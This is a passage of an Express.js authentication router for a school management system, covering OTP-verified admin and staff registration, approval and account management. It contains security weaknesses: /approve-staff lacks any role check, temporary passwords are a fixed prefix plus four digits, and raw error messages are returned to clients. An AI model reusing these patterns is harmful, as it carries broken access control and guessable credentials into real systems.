    const expires = new Date(Date.now() + 10 * 60 * 1000);
    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
    const hashedPassword = await bcrypt.hash(tempPassword, 10);

    await supabase.from('admins').insert({
      email: lowerEmail,
      phone,
      password: hashedPassword,
      name: name.trim(),
      role: 'admin',
      is_approved: false,
      otp: hashedOtp,
      otp_expires: expires,
    });

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: email,
      subject: 'Admin Registration OTP',
      html: `<p>Your OTP for admin registration is:</p><h1>${otp}</h1><p>It expires in 10 minutes.</p>`,
    };
    await transporter.sendMail(mailOptions);
    res.json({ message: 'OTP sent to email. Please verify to complete registration.' });
  } catch (error) {
    console.error('Apply admin error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// PUBLIC ENDPOINT: Verify OTP and finalize admin creation
router.post('/verify-admin-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) {
      return res.status(400).json({ message: 'Email and OTP are required' });
    }

    const lowerEmail = email.toLowerCase();
    const { data: admin, error } = await supabase
      .from('admins')
      .select('*')
      .eq('email', lowerEmail)
      .eq('is_approved', false)
      .single();

    if (error || !admin) {
      return res.status(404).json({ message: 'Pending admin not found' });
    }
    if (!admin.otp || !admin.otp_expires || new Date(admin.otp_expires) < new Date()) {
      return res.status(400).json({ message: 'OTP has expired or not set' });
    }

    const match = await bcrypt.compare(otp, admin.otp);
    if (!match) {
      return res.status(400).json({ message: 'Invalid OTP' });
    }

    await supabase
      .from('admins')
      .update({ otp: null, otp_expires: null })
      .eq('id', admin.id);

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: admin.email,
      subject: 'Email Verification Successful - Await Approval',
      html: `<p>Your email has been successfully verified.</p><p>The Super Admin must now review and approve your request. Once approved, you will receive an email with your temporary password.</p>`,
    };
    await transporter.sendMail(mailOptions);

    res.json({ message: 'OTP verified successfully. Await approval from superadmin.' });
  } catch (error) {
    console.error('Verify admin OTP error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});
// PUBLIC ENDPOINT: Apply for Staff Access
router.post('/apply-staff', async (req, res) => {
  try {
    const { email, phone, name } = req.body;
    const validation = require('../utils/validation');
    if (!validation.validateEmail(email)) return res.status(400).json({ message: 'Invalid email format' });
    if (!validation.validatePhone(phone)) return res.status(400).json({ message: 'Phone must be a 10-digit number' });
    if (!name) return res.status(400).json({ message: 'Name is required' });

    const lowerEmail = email.toLowerCase();
    const { data: exists } = await supabase.from('staff').select('id').eq('email', lowerEmail).single();
    if (exists) return res.status(400).json({ message: 'Staff with this email already exists' });

    const crypto = require('crypto');
    const otp = crypto.randomInt(100000, 999999).toString();
    const hashedOtp = await bcrypt.hash(otp, 10);
    const expires = new Date(Date.now() + 10 * 60 * 1000);
    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
    const hashedPassword = await bcrypt.hash(tempPassword, 10);

    await supabase.from('staff').insert({
      email: lowerEmail,
      phone,
      password_hash: hashedPassword,
      name: name.trim(),
      role: 'teacher', // default to teacher
      is_approved: false,
      otp: hashedOtp,
      otp_expires: expires,
    });

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: email,
      subject: 'Staff Registration OTP',
      html: `<p>Your OTP for staff registration is:</p><h1>${otp}</h1><p>It expires in 10 minutes.</p>`,
    };
    await transporter.sendMail(mailOptions);
    res.json({ message: 'OTP sent to email. Please verify to complete registration.' });
  } catch (error) {
    console.error('Apply staff error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// PUBLIC ENDPOINT: Verify Staff OTP
router.post('/verify-staff-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    if (!email || !otp) return res.status(400).json({ message: 'Email and OTP are required' });

    const lowerEmail = email.toLowerCase();
    const { data: staffMember, error } = await supabase
      .from('staff')
      .select('*')
      .eq('email', lowerEmail)
      .eq('is_approved', false)
      .single();

    if (error || !staffMember) return res.status(404).json({ message: 'Pending staff not found' });
    if (!staffMember.otp || !staffMember.otp_expires || new Date(staffMember.otp_expires) < new Date()) {
      return res.status(400).json({ message: 'OTP has expired or not set' });
    }

    const match = await bcrypt.compare(otp, staffMember.otp);
    if (!match) return res.status(400).json({ message: 'Invalid OTP' });

    await supabase.from('staff').update({ otp: null, otp_expires: null }).eq('id', staffMember.id);

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: staffMember.email,
      subject: 'Email Verification Successful - Await Approval',
      html: `<p>Your email has been successfully verified.</p><p>The Admin must now review and approve your request. Once approved, you will receive an email with your temporary password.</p>`,
    };
    await transporter.sendMail(mailOptions);
    res.json({ message: 'OTP verified successfully. Await approval from admin.' });
  } catch (error) {
    console.error('Verify staff OTP error:', error);
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});



// POST /api/auth/register (protected — only superadmins can create new admins)
router.post('/register', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Insufficient privileges' });
    }

    const { email, phone, name, role, otp, newAdminOtp } = req.body;
    if (!email || !phone || !name) {
      return res.status(400).json({ message: 'Email, phone, and name are required' });
    }

    if (req.user.role !== 'developer') {
      if (!otp) return res.status(400).json({ message: 'OTP is required' });
      if (new Date(req.user.otp_expires) < new Date()) return res.status(400).json({ message: 'OTP has expired' });
      
      const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
      if (!otpMatch) return res.status(400).json({ message: 'Invalid Super Admin OTP' });

      if (!newAdminOtp) return res.status(400).json({ message: 'New Admin OTP is required' });
      if (new Date(req.user.new_admin_otp_expires) < new Date()) return res.status(400).json({ message: 'New Admin OTP has expired' });
      
      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.new_admin_otp || '');
      if (!newOtpMatch) return res.status(400).json({ message: 'Invalid New Admin OTP' });
    }

    const lowerEmail = email.toLowerCase();
    const { data: exists } = await supabase.from('admins').select('id').eq('email', lowerEmail).single();
    if (exists) return res.status(400).json({ message: 'Admin with this email already exists' });

    const validation = require('../utils/validation');
    if (!validation.validatePhone(phone)) return res.status(400).json({ message: 'Phone must be a 10-digit number' });
    if (!validation.validateEmail(lowerEmail)) return res.status(400).json({ message: 'Invalid email format' });

    const crypto = require('crypto');
    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
    const hashedPassword = await bcrypt.hash(tempPassword, 10);

    const { data: admin, error } = await supabase
      .from('admins')
      .insert({
        email: lowerEmail,
        phone,
        password: hashedPassword,
        name: name.trim(),
        role: role || 'admin',
        is_approved: true // Admins created by superadmin are auto-approved
      })
      .select()
      .single();

    if (req.user.role !== 'developer') {
      await supabase
        .from('admins')
        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
        .eq('id', req.user.id);
    }

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: email,
      subject: 'Your Admin Account Created',
      html: `<p>Your admin account has been created. Use the temporary password below to login and then change it immediately.</p><p><strong>${tempPassword}</strong></p>`
    };
    await transporter.sendMail(mailOptions).catch(e => console.error('Mail error:', e));

    res.status(201).json({
      id: admin.id,
      name: admin.name,
      email: admin.email,
      phone: admin.phone,
      role: admin.role,
      token: generateToken(admin.id),
    });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// GET /api/auth/admins (only superadmins)
router.get('/admins', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Forbidden' });
    }
    const { data: admins } = await supabase
      .from('admins')
      .select('id, name, email, phone, role, is_approved, created_at')
      .neq('role', 'developer');
    res.json(admins);
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// DELETE /api/auth/admins/:id (only superadmins)
router.delete('/admins/:id', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Insufficient privileges' });
    }

    const { data: adminToDelete } = await supabase.from('admins').select('*').eq('id', req.params.id).single();
    if (!adminToDelete) return res.status(404).json({ message: 'Admin not found' });

    if (adminToDelete.id === req.user.id) return res.status(403).json({ message: 'Cannot delete your own account' });
    if (adminToDelete.role === 'developer' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Developer accounts cannot be deleted by superadmins' });
    }

    if (adminToDelete.is_approved && req.user.role !== 'developer') {
      const { otp, newAdminOtp } = req.body;
      if (!otp) return res.status(400).json({ message: 'OTP is required' });
      if (new Date(req.user.otp_expires) < new Date()) return res.status(400).json({ message: 'OTP has expired' });
      
      const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
      if (!otpMatch) return res.status(400).json({ message: 'Invalid Super Admin OTP' });

      if (!newAdminOtp) return res.status(400).json({ message: 'Target Admin OTP is required' });
      if (new Date(req.user.new_admin_otp_expires) < new Date()) return res.status(400).json({ message: 'Target Admin OTP has expired' });
      
      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.new_admin_otp || '');
      if (!newOtpMatch) return res.status(400).json({ message: 'Invalid Target Admin OTP' });

      await supabase
        .from('admins')
        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
        .eq('id', req.user.id);
    }

    await supabase.from('admins').delete().eq('id', req.params.id);
    res.json({ message: 'Admin deleted successfully' });
  } catch (error) {
    res.status(500).json({ message: 'Server error' });
  }
});

// PUT /api/auth/admins/:id (only superadmins)
router.put('/admins/:id', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Insufficient privileges' });
    }

    const { name, email, role, password, otp, newAdminOtp } = req.body;
    const { data: admin } = await supabase.from('admins').select('*').eq('id', req.params.id).single();
    if (!admin) return res.status(404).json({ message: 'Admin not found' });

    if (req.user.role !== 'developer') {
      if (!otp || !newAdminOtp) return res.status(400).json({ message: 'Both OTPs are required' });
      
      const otpMatch = await bcrypt.compare(otp, req.user.otp || '');
      const newOtpMatch = await bcrypt.compare(newAdminOtp, req.user.new_admin_otp || '');
      
      if (!otpMatch || !newOtpMatch) return res.status(400).json({ message: 'Invalid OTPs' });

      await supabase
        .from('admins')
        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
        .eq('id', req.user.id);
    }

    if (admin.role === 'developer' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Developer accounts cannot be modified by superadmins' });
    }

    const updates = {};
    if (name) updates.name = name.trim();
    if (email) updates.email = email.toLowerCase();
    if (role) {
      if (role === 'developer' && req.user.role !== 'developer') return res.status(403).json({ message: 'Unauthorized' });
      updates.role = role;
    }
    if (password) updates.password = await bcrypt.hash(password, 10);

    const { data: updatedAdmin } = await supabase
      .from('admins')
      .update(updates)
      .eq('id', req.params.id)
      .select('id, name, email, role')
      .single();

    res.json({ message: 'Admin details updated successfully', admin: updatedAdmin });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/approve-admin
router.post('/approve-admin', protect, async (req, res) => {
  try {
    if (req.user.role !== 'superadmin' && req.user.role !== 'developer') {
      return res.status(403).json({ message: 'Insufficient privileges' });
    }

    const { adminId, otp, newAdminOtp } = req.body;
    const { data: adminToApprove } = await supabase.from('admins').select('*').eq('id', adminId).single();
    if (!adminToApprove) return res.status(404).json({ message: 'Admin not found' });

    if (req.user.role !== 'developer') {
      if (!otp || !newAdminOtp) return res.status(400).json({ message: 'Both OTPs are required' });

      const isSuperAdminOtpValid = await bcrypt.compare(otp, req.user.otp);
      const isTargetAdminOtpValid = await bcrypt.compare(newAdminOtp, adminToApprove.otp);
      
      if (!isSuperAdminOtpValid || !isTargetAdminOtpValid) {
        return res.status(400).json({ message: 'Invalid OTPs' });
      }

      await supabase
        .from('admins')
        .update({ otp: null, otp_expires: null, new_admin_otp: null, new_admin_otp_expires: null })
        .eq('id', req.user.id);
    }

    const crypto = require('crypto');
    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
    const hashedPassword = await bcrypt.hash(tempPassword, 10);

    await supabase
      .from('admins')
      .update({ is_approved: true, password: hashedPassword, otp: null, otp_expires: null })
      .eq('id', adminId);

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: adminToApprove.email,
      subject: 'Your Admin Account Has Been Approved!',
      html: `<p>Your admin account has been approved by the superadmin.</p><p>Use the temporary password below to login and then change it immediately upon logging in.</p><p><strong>${tempPassword}</strong></p>`,
    };
    await transporter.sendMail(mailOptions);

    res.json({ message: 'Admin approved successfully and password sent' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/approve-staff
router.post('/approve-staff', protect, async (req, res) => {
  try {
    const { staffId } = req.body;
    const { data: staffToApprove } = await supabase.from('staff').select('*').eq('id', staffId).single();
    if (!staffToApprove) return res.status(404).json({ message: 'Staff not found' });

    const crypto = require('crypto');
    const tempPassword = 'HolyName#' + crypto.randomInt(1000, 9999).toString();
    const hashedPassword = await bcrypt.hash(tempPassword, 10);

    await supabase
      .from('staff')
      .update({ is_approved: true, password_hash: hashedPassword, otp: null, otp_expires: null })
      .eq('id', staffId);

    const mailOptions = {
      from: `"Holy Name School System" <${process.env.EMAIL_USER}>`,
      to: staffToApprove.email,
      subject: 'Your Staff Account Has Been Approved!',
      html: `<p>Your staff account has been approved by the admin.</p><p>Use the temporary password below to login and then change it immediately upon logging in.</p><p><strong>${tempPassword}</strong></p>`,
    };
    await transporter.sendMail(mailOptions);

    res.json({ message: 'Staff approved successfully and password sent' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});


// GET /api/auth/school-admins (for school admins to manage their sub-admins)
router.get('/school-admins', protect, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({ message: 'Forbidden: Only school admins can manage sub-admins' });
    }
    const { data: admins } = await supabase
      .from('admins')
      .select('id, first_name, last_name, email, phone, is_approved, created_at')
      .eq('school_id', req.user.school_id)
      .eq('role', 'admin');
    res.json(admins);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// POST /api/auth/school-admins (for school admins to add sub-admins)
router.post('/school-admins', protect, async (req, res) => {
  try {
    if (req.user.role !== 'admin') {
      return res.status(403).json({ message: 'Forbidden' });
    }
    
    // Check limit (Max 3 admins per school)
    const { count } = await supabase
      .from('admins')
      .select('id', { count: 'exact' })
      .eq('school_id', req.user.school_id)
      .eq('role', 'admin');
      
    if (count >= 3) {
      return res.status(400).json({ message: 'Limit reached: Maximum 3 admins allowed per school.' });
    }

    const { first_name, last_name, email, phone, password } = req.body;
    const lowerEmail = email.toLowerCase();
    const { data: exists } = await supabase.from('admins').select('id').eq('email', lowerEmail).single();
    
    if (exists) {
      return res.status(400).json({ message: 'Email already exists' });
    }
    
    const bcrypt = require('bcryptjs');
    const salt = await bcrypt.genSalt(10);
    const hashedPassword = await bcrypt.hash(password, salt);

    const { data: admin, error } = await supabase.from('admins').insert({
      first_name,
      last_name,
      email: lowerEmail,
      phone,
      password: hashedPassword,
      school_id: req.user.school_id,
      role: 'admin',
      is_approved: true // Auto approved since created by the primary admin
    }).select().single();

    if (error) throw error;
    res.status(201).json(admin);
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

// DELETE /api/auth/school-admins/:id
router.delete('/school-admins/:id', protect, async (req, res) => {
  try {
    if (req.user.role !== 'admin') return res.status(403).json({ message: 'Forbidden' });
    
    // Ensure the admin to delete belongs to the same school
    const { data: adminToDelete } = await supabase.from('admins').select('school_id').eq('id', req.params.id).single();
    if (!adminToDelete || adminToDelete.school_id !== req.user.school_id) {
      return res.status(404).json({ message: 'Admin not found' });
    }
    
    // Cannot delete oneself
    if (req.params.id === req.user.id) {
      return res.status(400).json({ message: 'Cannot delete your own account' });
    }
    
    await supabase.from('admins').delete().eq('id', req.params.id);
    res.json({ message: 'Admin removed successfully' });
  } catch (error) {
    res.status(500).json({ message: 'Server error', error: error.message });
  }
});

module.exports = router;
